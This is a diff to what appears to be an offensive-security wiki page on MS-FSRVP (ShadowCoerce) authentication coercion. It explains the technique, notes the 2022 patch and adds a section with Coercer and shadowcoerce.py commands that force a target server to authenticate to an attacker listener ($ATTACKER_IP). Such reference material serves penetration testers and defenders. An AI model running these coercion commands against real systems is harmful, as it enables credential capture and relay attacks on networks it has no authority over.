@@ -13,16 +13,26 @@ In late 2021, [Lionel GILLES](https://twitter.com/topotam77) published [slides](
 
 Similarly to other MS-RPC abuses, this works by using a specific method relying on remote UNC paths. In this case, at the time of writing, two methods were detected as vulnerable: `IsPathSupported` and `IsPathShadowCopied`.
 
-The coerced authentications are made over SMB. Unlike other similar coercion methods (MS-RPRN printerbug, MS-EFSR petitpotam), I doubt MS-FSRVP abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP.
+The coerced authentications are made over SMB. Unlike other similar coercion methods (MS-RPRN printerbug, MS-EFSR petitpotam), I doubt MS-FSRVP abuse can be combined with [WebClient abuse](../webclient.md) to elicit incoming authentications made over HTTP.
 
 A requirement to the abuse is to have the "File Server VSS Agent Service" enabled on the target server.
 
-![](<./assets/File Server VSS Agent Service.png>)
+![](<../assets/File Server VSS Agent Service.png>)
 
 > [!TIP]
 > In June 2022, Microsoft patched [CVE-2022-30154](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30154) in [KB5014692](https://support.microsoft.com/en-us/topic/kb5015527-shadow-copy-operations-using-vss-on-remote-smb-shares-denied-access-after-installing-windows-update-dated-june-14-2022-6d460245-08b6-40f4-9ded-dd030b27850b), which also patched this coercion attack.
 
 ## Practice
+
+[Coercer](https://github.com/p0dalirius/Coercer) (Python) can also be used to trigger all available MS-RPC coercions (including this one) in a single tool, with or without target filtering.
+
+```bash
+# Scan for available coercion methods
+coercer scan -t $TARGET -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+
+# Coerce authentication to attacker listener
+coercer coerce -t $TARGET -l $ATTACKER_IP -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
+```
 
 The following Python proof-of-concept ([https://github.com/ShutdownRepo/ShadowCoerce](https://github.com/ShutdownRepo/ShadowCoerce)) implements the `IsPathSupported` and `IsPathShadowCopied` methods.
 
@@ -33,7 +43,7 @@ The following Python proof-of-concept ([https://github.com/ShutdownRepo/ShadowCo
 shadowcoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" LISTENER TARGET
 ```
 
-![](<./assets/MS FSRVP abuse example.png>)
+![](<../assets/MS FSRVP abuse example.png>)
 
 > [!NOTE]
 > In my tests, the coercion needed to be attempted twice in order to work when the FssAgent hadn't been requested in a while. In short, run the command again if it doesn't work the first time.
